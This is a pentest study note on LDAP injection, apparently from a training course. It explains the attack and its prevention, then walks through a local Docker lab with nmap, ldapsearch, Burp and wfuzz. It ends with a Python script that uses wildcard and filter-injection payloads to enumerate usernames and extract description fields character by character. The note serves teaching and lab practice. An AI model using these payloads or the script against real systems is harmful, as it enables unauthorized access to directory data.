---
title: "LDAP Inyection"
category: ["S4VITAR", "fases", "6-OWASP 10", "LDAP Inyection"]
---

**LDAP** (**Lightweight Directory Access Protocol**) injections are a type of attack that exploits vulnerabilities in web applications interacting with an LDAP server. The LDAP server is a directory used to store user and resource information on a network.

LDAP injection works by inserting malicious LDAP commands into input fields of a web application, which are then sent to the LDAP server for processing. If the web application is not properly designed to handle user input, an attacker can exploit this weakness to perform unauthorized operations on the LDAP server.

Like SQL and NoSQL injections, LDAP injections can be very dangerous. Some examples of what an attacker could achieve through LDAP injection include:

- Accessing user or resource information they shouldn't have access to.
- Making unauthorized changes to the LDAP server database, such as adding or deleting users or resources.
- Performing malicious operations on the network, such as launching phishing attacks or installing malware on network systems.

To prevent LDAP injections, web applications that interact with an LDAP server must properly validate and sanitize user input before sending it to the LDAP server. This includes validating input field syntax, removing special characters, and limiting the commands that can be executed on the LDAP server.

It's also important for web applications to run with minimal privileges on the network and to regularly monitor LDAP server activities to detect potential injections.

**LAB**  
- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

WHAT IS LDAP  
https://www.profesionalreview.com/2019/01/05/ldap/

Using Docker, we'll set up a machine to act as an LDAP server and an LDAP client machine.

![Pasted image 20260128162215](/VaultSite/wiki-images/Pasted%20image%2020260128162215.png)

We'll perform reconnaissance with nmap.

If we search with `locate .nse` and filter with `grep ldap`, we'll see the scripts nmap has for LDAP.  
![Pasted image 20260128162531](/VaultSite/wiki-images/Pasted%20image%2020260128162531.png)

We'll run nmap with all scripts that start or contain the word LDAP on port 389 (the default LDAP port) and the specific IP. In `namingContexts`, we see `dc=example, dc=org`. This corresponds to the search base. If the domain were named david.org, it would show `dc=david,dc=org`.  
![Pasted image 20260128162646](/VaultSite/wiki-images/Pasted%20image%2020260128162646.png)

With `ldapsearch`, we perform a search using `-b` to add what we captured with nmap, `-D` to specify the user we want to authenticate, and `-w` to specify the password.  
![Pasted image 20260128162934](/VaultSite/wiki-images/Pasted%20image%2020260128162934.png)  
In the last part where we put `'cn=admin'`, this is an LDAP search filter. We can play with ANDs (`&`) and ORs (`|`) to concatenate filters and make them more complex.

In the next query, we'll search for information about an admin user with the description LDAP.  
![Pasted image 20260128163432](/VaultSite/wiki-images/Pasted%20image%2020260128163432.png)

In LDAP, we can use `*`. If the code isn't sanitized, an asterisco acts like a regex wildcard for the entire password.  
![Pasted image 20260128164309](/VaultSite/wiki-images/Pasted%20image%2020260128164309.png)  
![Pasted image 20260128164315](/VaultSite/wiki-images/Pasted%20image%2020260128164315.png)

Let's open Burp Suite.  
![Pasted image 20260128164406](/VaultSite/wiki-images/Pasted%20image%2020260128164406.png)  
We send it to the Repeater.  
We see that if we send it with `*`, we get a 301 code.  
![Pasted image 20260128164529](/VaultSite/wiki-images/Pasted%20image%2020260128164529.png)

If we play with the asterisk, we could try, for example, `a*` for the user, which means "user starts with a".  
![Pasted image 20260128164611](/VaultSite/wiki-images/Pasted%20image%2020260128164611.png)  
If we try `b*`:  
![Pasted image 20260128164656](/VaultSite/wiki-images/Pasted%20image%2020260128164656.png)  
We see it redirects us back to the initial page because there's no user starting with b.

We'd keep testing letter by letter until we can list users.  

To speed this up, we'll create a script.

**Note**: Users can have attributes like email addresses or phone numbers.  

To discover these ATTRIBUTES, we'd use the dictionary `seclists/LDAP-openldap-attributes.txt` with `wfuzz`.  

In this case, since we saw the data is sent via POST, we'll specify it in wfuzz with `-d 'burpsuite_data'`.  
![Pasted image 20260128171155](/VaultSite/wiki-images/Pasted%20image%2020260128171155.png)  
![Pasted image 20260128171230](/VaultSite/wiki-images/Pasted%20image%2020260128171230.png)  
And since we also want to filter a new attribute, we'd need to add parentheses for the new data and another one so the query isn't applied to the password field, plus a null byte to prevent comparison: `(FUZZ=*))%00`.  
![Pasted image 20260128171548](/VaultSite/wiki-images/Pasted%20image%2020260128171548.png)  
![Pasted image 20260128171644](/VaultSite/wiki-images/Pasted%20image%2020260128171644.png)

We'll apply a filter since we see most responses show 439 characters, and now we'll see valid attributes.  
![Pasted image 20260128171659](/VaultSite/wiki-images/Pasted%20image%2020260128171659.png)  
![Pasted image 20260128171718](/VaultSite/wiki-images/Pasted%20image%2020260128171718.png)

Now that we know the valid attributes, we can try to see phone numbers by fuzzing that specific field. Let's try with the user `s4vitar`.  
![Pasted image 20260128172034](/VaultSite/wiki-images/Pasted%20image%2020260128172034.png)  
We see it starts with 6. Now we'd add numbers right before the FUZZ until we have the complete phone number.  
![Pasted image 20260128172143](/VaultSite/wiki-images/Pasted%20image%2020260128172143.png)  
And so on for any other fields we want to know.

We'll automate this with a script for speed.

```python
#!/usr/bin/python3

import requests
import time
import sys
import signal
import string
from pwn import *


def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


main_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}

def getInitialUsers():
    characters = string.ascii_lowercase
    initial_users = []
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    for character in characters:
        # The payload uses '*' as an LDAP wildcard to identify the first letter of the user
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
        
        if r.status_code == 301:
            initial_users.append(character)
            
    return initial_users

def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    valid_users = []

    for first_character in initial_users:
        user = ""
        for position in range(0, 15):
            for character in characters:
                # Attempts to guess the username character by character
                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
                
                if r.status_code == 301:
                    user += character
                    break
        
        valid_users.append(first_character + user)

    print("\n")
    for user in valid_users:
        log.info("Valid user found: %s" % user)
    print("\n")
    
    return valid_users

def getDescription(user):
    characters = string.ascii_lowercase + ' '
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    description = ""

    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")
    time.sleep(2)
    
    p2 = log.progress("Description")

    for position in range(0, 50):
        for character in characters:
            # Complex payload to filter by description using LDAP injection
            # Structure: user_id=admin)(description=a*)
            post_data = "user_id={})(description={}{}*)&password=*&login=1&submit=Submit".format(user, description, character)
            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301:
                description += character
                p2.status(description)
                break
                
    p1.success("Brute force process completed")
    p2.success("User description is: %s" % description)

if __name__ == '__main__':
    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)
    
    # Extracts the description of the first 5 users found
    for i in range(0, 5):
        if i < len(valid_users):
            getDescription(valid_users[i])
```
